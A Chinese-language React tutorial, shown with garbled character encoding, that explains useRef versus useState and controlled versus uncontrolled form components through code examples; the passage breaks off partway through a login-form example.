pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Hooks å‡½æ•°ä¹‹ useRef ä¸ useStateï¼Œå—æ§ç»„ä»¶ä¸éå—æ§ç»„ä»¶</h2>
<p>å¤§å®¶å¥½å‘€ï½ ä»Šå¤©å’±ä»¬æ¥èŠèŠ React ä¸­éå¸¸é‡è¦çš„ä¸¤ä¸ª Hooks ä»¥åŠè¡¨å•å¤„ç†çš„ä¸¤ç§æ–¹å¼ â€”â€”useRefã€useStateï¼Œè¿˜æœ‰å—æ§ç»„ä»¶ä¸éå—æ§ç»„ä»¶ã€‚è¿™äº›å¯æ˜¯ React å¼€å‘ä¸­çš„åŸºç¡€åˆæ ¸å¿ƒçš„çŸ¥è¯†ç‚¹å“¦ï¼ŒæŒæ¡å®ƒä»¬èƒ½è®©å’±ä»¬çš„ä»£ç æ›´ä¼˜é›…ã€æ›´é«˜æ•ˆï½ ğŸ˜Š</p>
<h3 data-id="heading-1">ä¸€ã€useRef ğŸ“Œ</h3>
<h4 data-id="heading-2">1. ä»€ä¹ˆæ˜¯ useRef</h4>
<p>useRef æ˜¯ React ä¸­ç”¨äºæŒä¹…åŒ–æ•°æ®ï¼ˆè·¨ç»„ä»¶æ¸²æŸ“å‘¨æœŸä¿å­˜å€¼ï¼‰å’Œç›´æ¥æ“ä½œ DOM å…ƒç´ çš„ Hookï¼Œæ ¸å¿ƒä½œç”¨æ˜¯ â€œåœ¨ç»„ä»¶ç”Ÿå‘½å‘¨æœŸå†…ä¿æŒä¸€ä¸ªå¯å˜çš„å¼•ç”¨â€ã€‚ç®€å•è¯´ï¼Œå®ƒå°±åƒä¸€ä¸ª â€œä¿é™©ç®±â€ï¼Œå¯ä»¥å­˜ä¸œè¥¿ï¼Œè€Œä¸”ä¸ç®¡ç»„ä»¶æ€ä¹ˆé‡æ–°æ¸²æŸ“ï¼Œè¿™ä¸ª â€œä¿é™©ç®±â€ æœ¬èº«ä¸ä¼šå˜ï¼Œé‡Œé¢çš„ä¸œè¥¿å´èƒ½éšæ—¶æ‹¿å‡ºæ¥ç”¨ï½</p>
<h4 data-id="heading-3">2. useRef çš„ç‰¹æ€§</h4>
<ul>
<li><strong>è¿”å›å€¼</strong>ï¼šè°ƒç”¨Â <code>useRef(initialValue)</code>Â ä¼šè¿”å›ä¸€ä¸ªä¸å¯å˜çš„å®¹å™¨å¯¹è±¡ï¼ˆref å¯¹è±¡ï¼‰ï¼Œè¯¥å¯¹è±¡åªæœ‰ä¸€ä¸ªå±æ€§Â <code>current</code>ï¼Œç”¨äºå­˜å‚¨å®é™…å€¼ã€‚</li>
<li><strong>è·¨æ¸²æŸ“å‘¨æœŸä¿æŒå¼•ç”¨</strong>ï¼šuseRef è¿”å›çš„ ref å®¹å™¨å¯¹è±¡åœ¨ç»„ä»¶çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…å¼•ç”¨åœ°å€ä¸å˜ï¼ˆå³ä½¿ç»„ä»¶å¤šæ¬¡é‡æ–°æ¸²æŸ“ï¼Œå®ƒè¿˜æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼‰ã€‚</li>
<li><strong>ä¿®æ”¹ current ä¸ä¼šè§¦å‘é‡æ¸²æŸ“</strong>ï¼šç›´æ¥ä¿®æ”¹Â <code>refContainer.current</code>Â çš„å€¼ï¼Œä¸ä¼šå¯¼è‡´ç»„ä»¶é‡æ–°æ¸²æŸ“ï¼Œè¿™æ˜¯å®ƒä¸ useState çš„æ ¸å¿ƒåŒºåˆ«ã€‚</li>
</ul>
<p><strong>ä»£ç ä¸¾ä¾‹ï¼š</strong></p>
<p>å’±ä»¬æ¥çœ‹Â <code>App2.jsx</code>Â ä¸­çš„ä¾‹å­ï¼š</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// å“åº”å¼çŠ¶æ€ï¼Œä¿®æ”¹ä¼šè§¦å‘é‡æ¸²æŸ“</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç»„ä»¶æ¸²æŸ“äº†...'</span>); <span class="hljs-comment">// æ¯æ¬¡countå˜åŒ–éƒ½ä¼šæ‰“å°ï¼Œè¯æ˜é‡æ¸²æŸ“</span>
  
  <span class="hljs-comment">// åˆ›å»ºrefå¯¹è±¡ï¼Œåˆå§‹å€¼ä¸ºnull</span>
  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>); 
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'refå®¹å™¨å¯¹è±¡ï¼š'</span>, inputRef); <span class="hljs-comment">// æ¯æ¬¡æ¸²æŸ“æ‰“å°çš„éƒ½æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼ˆå¼•ç”¨ä¸å˜ï¼‰</span>

  <span class="hljs-comment">// ç»„ä»¶æŒ‚è½½å®Œæˆåæ‰§è¡Œï¼ˆç±»ä¼¼vueçš„onMountedï¼‰</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'input DOMå…ƒç´ ï¼š'</span>, inputRef.<span class="hljs-property">current</span>); <span class="hljs-comment">// æ­¤æ—¶currentå·²æŒ‡å‘inputå…ƒç´ </span>
    inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>(); <span class="hljs-comment">// æ“ä½œDOMï¼Œè®©è¾“å…¥æ¡†è‡ªåŠ¨èšç„¦</span>
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      {/* å°†refå¯¹è±¡ç»‘å®šåˆ°inputå…ƒç´  */}
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{inputRef}</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>count: {count}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      {/* ç‚¹å‡»æŒ‰é’®ä¿®æ”¹countï¼Œè§¦å‘ç»„ä»¶é‡æ¸²æŸ“ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;count ++<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  )
}
</code></pre>
<p><strong>ä»£ç æ•ˆæœè¯¦è§£ï¼š</strong></p>
<ul>
<li>å½“ç‚¹å‡»Â <code>count ++</code>Â æŒ‰é’®æ—¶ï¼Œ<code>count</code>Â çŠ¶æ€å˜åŒ–ä¼šè§¦å‘ç»„ä»¶é‡æ¸²æŸ“ï¼Œæ§åˆ¶å°ä¼šæ‰“å° â€œç»„ä»¶æ¸²æŸ“äº†...â€ã€‚</li>
<li>ä½†æ¯æ¬¡æ‰“å°çš„Â <code>inputRef</code>Â éƒ½æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼ˆå¼•ç”¨åœ°å€ä¸å˜ï¼‰ï¼Œè¿™ä½“ç°äº† â€œè·¨æ¸²æŸ“å‘¨æœŸä¿æŒå¼•ç”¨â€ çš„ç‰¹æ€§ã€‚</li>
<li><code>useEffect</code>Â é’©å­åœ¨ç»„ä»¶æŒ‚è½½åæ‰§è¡Œï¼Œæ­¤æ—¶Â <code>inputRef.current</code>Â å·²ç»æŒ‡å‘äº† input DOM å…ƒç´ ï¼Œé€šè¿‡Â <code>focus()</code>Â æ–¹æ³•å®ç°äº†è‡ªåŠ¨èšç„¦ï¼Œå±•ç¤ºäº† useRef æ“ä½œ DOM çš„èƒ½åŠ›ã€‚</li>
<li>å³ä½¿å¤šæ¬¡ä¿®æ”¹Â <code>inputRef.current</code>ï¼ˆæ¯”å¦‚æ‰‹åŠ¨ä¿®æ”¹å®ƒçš„å€¼ï¼‰ï¼Œä¹Ÿä¸ä¼šè§¦å‘ç»„ä»¶é‡æ¸²æŸ“ï¼Œè¿™å’Œ useState å®Œå…¨ä¸åŒï½</li>
</ul>
<p>æ³¨æ„è§‚å¯Ÿï¼Œå…‰æ ‡è‡ªåŠ¨èšç„¦äºè¾“å…¥æ¡†ã€ç»„ä»¶æ¸²æŸ“äº†è€Œ<code>inputRef</code>å®¹å™¨å¯¹è±¡å§‹ç»ˆä¸å˜ã€ä¿®æ”¹<code>inputRef.current</code>çš„å€¼ä¸ä¼šè§¦å‘é‡æ–°æ¸²æŸ“ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6388896f9283442aa9340c68837b7349~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb3h1ZV8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767893112&amp;x-signature=ufp4hnB3fdU%2B9yuQKUp%2BNkWTy5M%3D" alt="QQ202612-0438.gif" loading="lazy"/></p>
<h4 data-id="heading-4">3. useRef ä¸ useState æ¯”è¾ƒ ğŸ’¡</h4>






























<table><thead><tr><th>ç‰¹æ€§</th><th>useRef</th><th>useState</th></tr></thead><tbody><tr><td>æœ¬è´¨</td><td>ç”¨äºå­˜å‚¨ â€œæŒä¹…åŒ–çš„å¯å˜å€¼â€ï¼ˆéå“åº”å¼ï¼‰</td><td>ç”¨äºç®¡ç†ç»„ä»¶çš„å“åº”å¼çŠ¶æ€</td></tr><tr><td>è§¦å‘é‡æ¸²æŸ“</td><td>ä¿®æ”¹Â <code>current</code>Â ä¸ä¼šè§¦å‘é‡æ¸²æŸ“</td><td>è°ƒç”¨Â <code>setXxx</code>Â ä¼šè§¦å‘é‡æ¸²æŸ“</td></tr><tr><td>è·¨æ¸²æŸ“å‘¨æœŸ</td><td>å®¹å™¨å¯¹è±¡å¼•ç”¨ä¸å˜ï¼Œ<code>current</code>Â å¯ä¿®æ”¹</td><td>æ¯æ¬¡æ¸²æŸ“ä¼šåˆ›å»ºæ–°çš„çŠ¶æ€å˜é‡ï¼ˆå€¼å¯èƒ½ç›¸åŒï¼‰</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>æ“ä½œ DOMã€å­˜å‚¨å®šæ—¶å™¨ IDã€ç¼“å­˜æ•°æ®ç­‰</td><td>ç®¡ç†å½±å“ UI å±•ç¤ºçš„çŠ¶æ€ï¼ˆå¦‚è¡¨å•è¾“å…¥ã€å¼€å…³çŠ¶æ€ç­‰ï¼‰</td></tr></tbody></table>
<p><strong>hookså‡½æ•°ä¸­çš„useState åœ¨æˆ‘å‰é¢çš„æ–‡ç« é‡Œè®²è§£è¿‡ï¼Œä¸æ¸…æ¥šæˆ–è€…æ„Ÿå…´è¶£çš„å°ä¼™ä¼´å¯ä»¥å»ç¿»å‡ºæ¥çœ‹çœ‹ã€‚</strong></p>
<p>å’±ä»¬å†çœ‹ä¸€ä¸ªå¯¹æ¯”æ¡ˆä¾‹ï¼š</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// App.jsxï¼ˆç”¨æ™®é€šå˜é‡å­˜å®šæ—¶å™¨IDï¼Œå¤±è´¥æ¡ˆä¾‹ï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> intervalId = <span class="hljs-literal">null</span>; <span class="hljs-comment">// æ¯æ¬¡æ¸²æŸ“éƒ½ä¼šé‡ç½®ä¸ºnull</span>
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">start</span>(<span class="hljs-params"/>) {
    intervalId = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'tick~~~'</span>); }, <span class="hljs-number">1000</span>);
  }

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">stop</span>(<span class="hljs-params"/>) {
    <span class="hljs-built_in">clearInterval</span>(intervalId); <span class="hljs-comment">// æ— æ³•åœæ­¢ï¼å› ä¸ºintervalIdå·²è¢«é‡ç½®</span>
  }

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;&gt;</span>{/* æŒ‰é’®çœç•¥ */}<span class="hljs-tag">&lt;/&gt;</span></span>;
}
</code></pre>
<p>æ³¨æ„è§‚å¯Ÿï¼šç‚¹å‡»å¼€å§‹æŒ‰é’®ï¼Œç³»ç»Ÿè‡ªåŠ¨åˆ†é…ä¸€ä¸ªIDå€¼ï¼Œç‚¹å‡»åœæ­¢ï¼Œå¯ä»¥åœæ­¢å› ä¸ºæ­¤æ—¶IDå€¼æœªè¢«ä¿®æ”¹ï¼›å†æ¬¡ç‚¹å‡»å¼€å§‹æŒ‰é’®ï¼Œç‚¹å‡»count++ï¼Œç„¶åå†ç‚¹å‡»åœæ­¢ï¼Œæ­¤æ—¶æ— æ³•åœæ­¢ï¼Œå› ä¸ºIDå› countå€¼ä¿®æ”¹è§¦å‘useStateå“åº”å¼çŠ¶æ€ä¿®æ”¹å¯¼è‡´é‡æ–°æ¸²æŸ“è€Œè¢«é‡ç½®äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d9e0736a87744aeb64d6cd264584a88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb3h1ZV8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767893112&amp;x-signature=NJCehK5gWkszH8ouomTkz6ZaFHY%3D" alt="QQ202612-02344.gif" loading="lazy"/></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// App2.jsxï¼ˆç”¨useRefå­˜å®šæ—¶å™¨IDï¼ŒæˆåŠŸæ¡ˆä¾‹ï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> intervalId = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// è·¨æ¸²æŸ“å‘¨æœŸä¿æŒå¼•ç”¨</span>
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">start</span>(<span class="hljs-params"/>) {
    intervalId.<span class="hljs-property">current</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'tick~~~'</span>); }, <span class="hljs-number">1000</span>);
  }

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">stop</span>(<span class="hljs-params"/>) {
    <span class="hljs-built_in">clearInterval</span>(intervalId.<span class="hljs-property">current</span>); <span class="hljs-comment">// æˆåŠŸåœæ­¢ï¼å› ä¸ºcurrentä¿ç•™äº†å®šæ—¶å™¨ID</span>
  }

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;&gt;</span>{/* æŒ‰é’®çœç•¥ */}<span class="hljs-tag">&lt;/&gt;</span></span>;
}
</code></pre>
<p>æ³¨æ„è§‚å¯Ÿï¼šç‚¹å‡»å¼€å§‹æŒ‰é’®ï¼Œç³»ç»Ÿè‡ªåŠ¨åˆ†é…ä¸€ä¸ªIDå€¼ï¼Œç‚¹å‡»åœæ­¢ï¼Œå¯ä»¥åœæ­¢å› ä¸ºæ­¤æ—¶IDå€¼æœªè¢«ä¿®æ”¹ï¼›å†æ¬¡ç‚¹å‡»å¼€å§‹æŒ‰é’®ï¼Œç‚¹å‡»count++ï¼Œç„¶åå†ç‚¹å‡»åœæ­¢ï¼Œæ­¤æ—¶äº¦å¯ä»¥åœæ­¢ï¼Œå› ä¸ºuseRef å£°æ˜çš„IDä¸ä¼šå› ç»„ä»¶æ¸²æŸ“è€Œé‡ç½®ï¼Œå³IDå€¼ä»æœªè¢«ä¿®æ”¹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afd5f2d8cf484e7fab08e2d8ebe60153~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb3h1ZV8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767893112&amp;x-signature=ONUMEVvBBHLHWTC3L%2FGgXCOoASg%3D" alt="QQ202612-02935.gif" loading="lazy"/></p>
<p>è¿™ä¸ªä¾‹å­å®Œç¾ä½“ç°äº†ä¸¤è€…çš„åŒºåˆ«ï¼šæ™®é€šå˜é‡ä¼šåœ¨ç»„ä»¶é‡æ¸²æŸ“æ—¶é‡ç½®ï¼Œè€Œ useRef çš„Â <code>current</code>Â èƒ½æŒä¹…åŒ–å­˜å‚¨å€¼ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆç®¡ç†å®šæ—¶å™¨ã€è®¡æ—¶å™¨è¿™ç±»è·¨æ¸²æŸ“å‘¨æœŸçš„å€¼æ—¶ï¼ŒuseRef æ˜¯æ›´å¥½çš„é€‰æ‹©ï½</p>
<h3 data-id="heading-5">äºŒã€å—æ§ç»„ä»¶ä¸éå—æ§ç»„ä»¶ ğŸ“</h3>
<p>åœ¨ React ä¸­ï¼Œè¡¨å•å…ƒç´ ï¼ˆå¦‚ inputã€textareaã€select ç­‰ï¼‰çš„çŠ¶æ€ç®¡ç†æ–¹å¼åˆ†ä¸ºå—æ§ç»„ä»¶å’Œéå—æ§ç»„ä»¶ï¼Œä¸¤è€…çš„æ ¸å¿ƒåŒºåˆ«åœ¨äºçŠ¶æ€ç”±è°æ¥ç®¡ç†ã€‚</p>
<h4 data-id="heading-6">1. å—æ§ç»„ä»¶ï¼ˆControlled Componentsï¼‰</h4>
<h5 data-id="heading-7">ï¼ˆ1ï¼‰å®šä¹‰</h5>
<p>ç»„ä»¶çš„çŠ¶æ€ï¼ˆvalueï¼‰ç”± React çš„çŠ¶æ€ï¼ˆuseStateï¼‰ç®¡ç†ï¼Œè¡¨å•å…ƒç´ çš„å€¼å®Œå…¨å— React æ§åˆ¶ã€‚å°±åƒè€æ¿ï¼ˆReact çŠ¶æ€ï¼‰ç›´æ¥æŒ‡æŒ¥å‘˜å·¥ï¼ˆè¡¨å•å…ƒç´ ï¼‰ï¼Œå‘˜å·¥åšä»€ä¹ˆéƒ½å¾—å¬è€æ¿çš„ï½</p>
<h5 data-id="heading-8">ï¼ˆ2ï¼‰å·¥ä½œåŸç†</h5>
<ul>
<li>é€šè¿‡Â <code>value</code>Â å±æ€§å°† React çŠ¶æ€ä¸è¡¨å•å…ƒç´ ç»‘å®šï¼ˆå•å‘ç»‘å®šï¼‰ã€‚</li>
<li>é€šè¿‡Â <code>onChange</code>Â äº‹ä»¶ç›‘å¬è¾“å…¥å˜åŒ–ï¼Œå®æ—¶æ›´æ–° React çŠ¶æ€ã€‚</li>
<li>è¡¨å•å…ƒç´ çš„å€¼å§‹ç»ˆä¸ React çŠ¶æ€ä¿æŒä¸€è‡´ï¼Œå½¢æˆ â€œæ•°æ®é©±åŠ¨è§†å›¾â€ã€‚</li>
</ul>
<h5 data-id="heading-9">ï¼ˆ3ï¼‰ç‰¹ç‚¹</h5>
<ul>
<li><strong>çŠ¶æ€å®Œå…¨ç”± React æ§åˆ¶</strong>ï¼šè¡¨å•çš„å€¼å§‹ç»ˆå’ŒÂ <code>value</code>Â çŠ¶æ€ä¿æŒä¸€è‡´ï¼Œä¸ä¼šå‡ºç° â€œå¤±æ§â€ çš„æƒ…å†µã€‚</li>
<li><strong>å®æ—¶å¯æ“ä½œæ€§</strong>ï¼šå¯ä»¥éšæ—¶é€šè¿‡ä¿®æ”¹Â <code>value</code>Â çŠ¶æ€æ¥æ”¹å˜è¡¨å•å€¼ï¼ˆæ¯”å¦‚é‡ç½®è¾“å…¥ã€å¼ºåˆ¶å¡«å†™æ ¼å¼ç­‰ï¼‰ã€‚</li>
<li><strong>é€‚åˆåœºæ™¯</strong>ï¼šéœ€è¦å®æ—¶éªŒè¯ï¼ˆå¦‚è¾“å…¥é•¿åº¦é™åˆ¶ï¼‰ã€è¡¨å•è”åŠ¨ï¼ˆå¦‚ä¸€ä¸ªè¾“å…¥æ¡†å˜åŒ–å½±å“å¦ä¸€ä¸ªï¼‰ã€å®æ—¶å±•ç¤ºè¾“å…¥å†…å®¹çš„åœºæ™¯ã€‚</li>
</ul>
<h4 data-id="heading-10">2. éå—æ§ç»„ä»¶ï¼ˆUncontrolled Componentsï¼‰</h4>
<h5 data-id="heading-11">ï¼ˆ1ï¼‰å®šä¹‰</h5>
<p>ç»„ä»¶çš„çŠ¶æ€ç”± DOM è‡ªèº«ç®¡ç†ï¼ŒReact ä¸ç›´æ¥æ§åˆ¶è¡¨å•å…ƒç´ çš„å€¼ï¼Œè€Œæ˜¯é€šè¿‡ ref è®¿é—® DOM å…ƒç´ è·å–å€¼ã€‚å°±åƒè€æ¿ï¼ˆReactï¼‰ä¸ç›´æ¥æŒ‡æŒ¥å‘˜å·¥ï¼ˆè¡¨å•å…ƒç´ ï¼‰ï¼Œä½†éœ€è¦æ—¶ä¼šå» â€œæŸ¥å²—â€ï¼ˆé€šè¿‡ ref è·å–å€¼ï¼‰ï½</p>
<h5 data-id="heading-12">ï¼ˆ2ï¼‰å·¥ä½œåŸç†</h5>
<ul>
<li>ä½¿ç”¨ useRef åˆ›å»ºä¸€ä¸ª ref å¯¹è±¡ï¼Œç»‘å®šåˆ°è¡¨å•å…ƒç´ ã€‚</li>
<li>ä¸é€šè¿‡ onChange å®æ—¶æ›´æ–°çŠ¶æ€ï¼Œè€Œæ˜¯åœ¨éœ€è¦æ—¶ï¼ˆå¦‚æäº¤è¡¨å•ï¼‰é€šè¿‡Â <code>ref.current.value</code>Â è¯»å– DOM ä¸­çš„å€¼ã€‚</li>
</ul>
<h5 data-id="heading-13">ï¼ˆ3ï¼‰ç‰¹ç‚¹</h5>
<ul>
<li><strong>çŠ¶æ€ç”± DOM ç®¡ç†</strong>ï¼šè¾“å…¥çš„å€¼ç›´æ¥å­˜åœ¨ DOM ä¸­ï¼ŒReact ä¸è·Ÿè¸ªå®æ—¶å˜åŒ–ã€‚</li>
<li><strong>æŒ‰éœ€è·å–å€¼</strong>ï¼šåªæœ‰åœ¨éœ€è¦æ—¶ï¼ˆå¦‚æäº¤ã€ç‚¹å‡»æŒ‰é’®ï¼‰æ‰é€šè¿‡ ref è¯»å–å€¼ï¼Œå‡å°‘äº†çŠ¶æ€æ›´æ–°çš„é¢‘ç‡ã€‚</li>
<li><strong>é€‚åˆåœºæ™¯</strong>ï¼šä¸€æ¬¡æ€§è¯»å–å€¼ï¼ˆå¦‚è¡¨å•æäº¤ï¼‰ã€æ€§èƒ½æ•æ„Ÿåœºæ™¯ï¼ˆé¿å…é¢‘ç¹çŠ¶æ€æ›´æ–°ï¼‰ã€æ–‡ä»¶ä¸Šä¼ ï¼ˆinput type="file" å¿…é¡»ç”¨éå—æ§æ–¹å¼ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-14">3. å—æ§ç»„ä»¶ä¸éå—æ§ç»„ä»¶æ¯”è¾ƒ ğŸ†š</h4>






























<table><thead><tr><th>ç»´åº¦</th><th>å—æ§ç»„ä»¶</th><th>éå—æ§ç»„ä»¶</th></tr></thead><tbody><tr><td>çŠ¶æ€ç®¡ç†è€…</td><td>React çŠ¶æ€ï¼ˆuseStateï¼‰</td><td>DOM è‡ªèº«</td></tr><tr><td>è·å–å€¼æ–¹å¼</td><td>ç›´æ¥ä»çŠ¶æ€å˜é‡è·å–</td><td>é€šè¿‡Â <code>ref.current.value</code>Â è·å–</td></tr><tr><td>å®æ—¶æ€§</td><td>å®æ—¶æ›´æ–°çŠ¶æ€ï¼Œå¯å³æ—¶å“åº”</td><td>ä¸å®æ—¶æ›´æ–°ï¼ŒæŒ‰éœ€è¯»å–</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>å®æ—¶éªŒè¯ã€è¡¨å•è”åŠ¨ã€åŠ¨æ€åé¦ˆ</td><td>ä¸€æ¬¡æ€§æäº¤ã€æ–‡ä»¶ä¸Šä¼ ã€æ€§èƒ½ä¼˜åŒ–</td></tr></tbody></table>
<p><strong>å¦‚ä½•é€‰æ‹©ï¼Ÿ</strong></p>
<ul>
<li>å¤§éƒ¨åˆ†åœºæ™¯ä¼˜å…ˆç”¨å—æ§ç»„ä»¶ï¼Œå› ä¸ºå®ƒèƒ½æ›´å¥½åœ°ä½“ç° React â€œæ•°æ®é©±åŠ¨â€ çš„æ€æƒ³ï¼ŒçŠ¶æ€å¯æ§æ€§æ›´å¼ºã€‚</li>
<li>å½“éœ€è¦æ“ä½œæ–‡ä»¶ï¼ˆfile inputï¼‰ã€è¿½æ±‚æ€§èƒ½ï¼ˆå‡å°‘çŠ¶æ€æ›´æ–°ï¼‰æˆ–åªéœ€è¦ä¸€æ¬¡æ€§è·å–å€¼æ—¶ï¼Œç”¨éå—æ§ç»„ä»¶æ›´åˆé€‚ã€‚</li>
</ul>
<h4 data-id="heading-15">4.å®æˆ˜æ¼”ç»ƒï¼š</h4>
<p><strong>åºŸè¯ä¸å¤šè¯´ï¼Œå…ˆçœ‹ä»£ç ï¼š</strong></p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä» React åº“ä¸­å¯¼å…¥æ‰€éœ€çš„ä¸¤ä¸ª Hookï¼š</span>
<span class="hljs-comment">// useStateï¼šç”¨äºåˆ›å»ºå’Œç®¡ç†ç»„ä»¶çš„å“åº”å¼çŠ¶æ€</span>
<span class="hljs-comment">// useRefï¼šç”¨äºåˆ›å»º DOM å…ƒç´ å¼•ç”¨ï¼Œå®ç°å¯¹åŸç”Ÿ DOM çš„ç›´æ¥è®¿é—®</span>
<span class="hljs-keyword">import</span> {
  useState,
  useRef
} <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// å®šä¹‰å¹¶å¯¼å‡º App å‡½æ•°å¼ç»„ä»¶ï¼Œä½œä¸ºæ•´ä¸ªè¡¨å•çš„æ ¹ç»„ä»¶</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {

  <span class="hljs-comment">// åˆå§‹åŒ–å—æ§ç»„ä»¶çš„å“åº”å¼çŠ¶æ€</span>
  <span class="hljs-comment">// valueï¼šå­˜å‚¨ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†çš„è¾“å…¥å†…å®¹ï¼Œåˆå§‹å€¼ä¸ºç©ºå­—ç¬¦ä¸²</span>
  <span class="hljs-comment">// setValueï¼šæ›´æ–° value çŠ¶æ€çš„æ–¹æ³•ï¼Œè°ƒç”¨åä¼šè§¦å‘ç»„ä»¶é‡æ¸²æŸ“ï¼ŒåŒæ­¥æ›´æ–°å…³è”çš„ UI</span>
  <span class="hljs-keyword">const</span> [value, setValue] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);

  <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ª ref å¼•ç”¨å¯¹è±¡ï¼Œåˆå§‹å€¼ä¸º null</span>
  <span class="hljs-comment">// åç»­å°†ç»‘å®šåˆ°ç¬¬äºŒä¸ªè¾“å…¥æ¡†ï¼Œç”¨äºè·å–è¯¥è¾“å…¥æ¡†çš„åŸç”Ÿ DOM å…ƒç´ </span>
  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// å®šä¹‰è¡¨å•æäº¤çš„å¤„ç†å‡½æ•°ï¼Œe æ˜¯æµè§ˆå™¨åŸç”Ÿçš„è¡¨å•æäº¤äº‹ä»¶å¯¹è±¡</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">doLogin</span> = (<span class="hljs-params">e</span>) =&gt; {
